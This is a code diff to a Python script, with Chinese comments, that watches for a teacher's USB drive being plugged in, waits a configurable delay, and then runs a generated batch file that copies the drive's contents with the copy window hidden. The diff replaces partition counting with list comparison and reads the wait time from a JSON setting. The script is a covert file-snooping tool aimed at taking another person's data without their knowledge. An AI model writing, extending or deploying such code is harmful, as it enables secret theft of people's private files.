@@ -1,5 +1,5 @@
 #pip install psutil
-import psutil,shutil,os
+import psutil,json,os
 from time import sleep
 
 #新建文件夹以存放文件
@@ -10,13 +10,17 @@ except:
     pass
 dir=dir+r'\files'
 
-#获取磁盘信息
-disk=psutil.disk_partitions()
+#获取配置信息(wait:等待时间)
+try:
+    with open('setting.json','r') as f:
+        file=f.read()
+        setting=json.loads(file)
+        wait=int(setting['wait'])
+except:
+    wait=1 #默认等待时间
 
-#统计当前分区的数量
-time=0
-for i in disk:
-    time=time+1
+#获取磁盘信息
+old_disk=psutil.disk_partitions()
 
 #写一个bat隐藏复制时的窗口
 def cbat(copydir,dir):
@@ -32,25 +36,24 @@ def cbat(copydir,dir):
 
 #循环检测是否老师插入U盘
 while True:
-    disk=psutil.disk_partitions()
-    times=0
-    for i in disk:
-        times=times+1
-    print('当前分区数为：',times)
-    if times>time: #当前分区数变大时，就是老师插入U盘的时候
+    new_disk=psutil.disk_partitions()
+    print('当前分区数',len(new_disk))
+    if len(new_disk)>len(old_disk): #当前分区数变大时，就是老师插入U盘的时候
+        for i in old_disk:
+            new_disk.remove(i)
         print('开始复制...')
-        copydir=str(disk[times-1][0])
+        copydir=str(new_disk[0][0])
         print(copydir)
-        sleep(600) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
+        sleep(wait) #建议10分钟后才开始复制，因为这是老师打开U盘的时候
         cbat(copydir,dir)
         os.system('copy.bat')
-        os.remove('copy.bat')
-        print('复制完成')
-        time=time+1
-    elif times<time: #当前分区数变小时，就是老师拔出U盘的时候
-        time=0
-        for i in disk:
-            time=time+1
+        #os.remove('copy.bat')
+        print('bat开始运行...')
+        old_disk=psutil.disk_partitions()
+    elif len(new_disk)<len(old_disk): #当前分区数变小时，就是老师拔出U盘的时候
+        old_disk=psutil.disk_partitions()
+        print('waiting...')
+        sleep(wait)
     else:
         print('waiting...')
-        sleep(30) #每隔30秒获取磁盘信息
+        sleep(wait)
